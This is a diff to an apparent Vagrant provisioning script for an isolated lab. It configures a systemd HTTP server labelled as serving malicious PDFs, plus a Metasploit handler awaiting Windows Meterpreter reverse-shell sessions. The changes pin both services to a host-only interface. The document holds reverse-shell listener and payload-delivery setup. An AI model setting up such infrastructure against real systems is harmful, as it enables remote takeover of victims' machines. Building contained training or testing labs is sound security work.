@@ -10,13 +10,15 @@ mkdir -p /home/vagrant/.msf4/local
 sudo tee /etc/systemd/system/pdf-server.service > /dev/null << 'EOF'
 [Unit]
 Description=Malicious PDF HTTP Server
-After=network.target
+After=network.target sys-subsystem-net-devices-eth1.device
+Wants=sys-subsystem-net-devices-eth1.device
+BindsTo=sys-subsystem-net-devices-eth1.device
 
 [Service]
 Type=simple
 User=vagrant
 WorkingDirectory=/home/vagrant/.msf4/local
-# Bind only to host-only interface (192.168.56.101) not all interfaces
+# Bind only to host-only interface (192.168.56.101) on eth1
 ExecStart=/usr/bin/python3 -m http.server 8080 --bind 192.168.56.101
 Restart=always
 RestartSec=10
@@ -58,6 +60,7 @@ use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.56.101
 set LPORT 4444
+set ReverseListenerBindAddress 192.168.56.101
 set ExitOnSession false
 set SessionCommunicationTimeout 300
 set EnableStageEncoding true
@@ -68,13 +71,15 @@ EOF
 sudo tee /etc/systemd/system/metasploit-listener.service > /dev/null << 'EOF'
 [Unit]
 Description=Metasploit Listener for PDF Exploit
-After=network.target
+After=network.target sys-subsystem-net-devices-eth1.device
+Wants=sys-subsystem-net-devices-eth1.device
+BindsTo=sys-subsystem-net-devices-eth1.device
 
 [Service]
 Type=simple
 User=vagrant
 Environment="HOME=/home/vagrant"
-# Bind explicitly to host-only interface (192.168.56.101:4444)
+# Bind explicitly to host-only interface eth1 (192.168.56.101:4444)
 ExecStart=/usr/bin/msfconsole -q -r /etc/metasploit/listener.rc
 Restart=always
 RestartSec=10
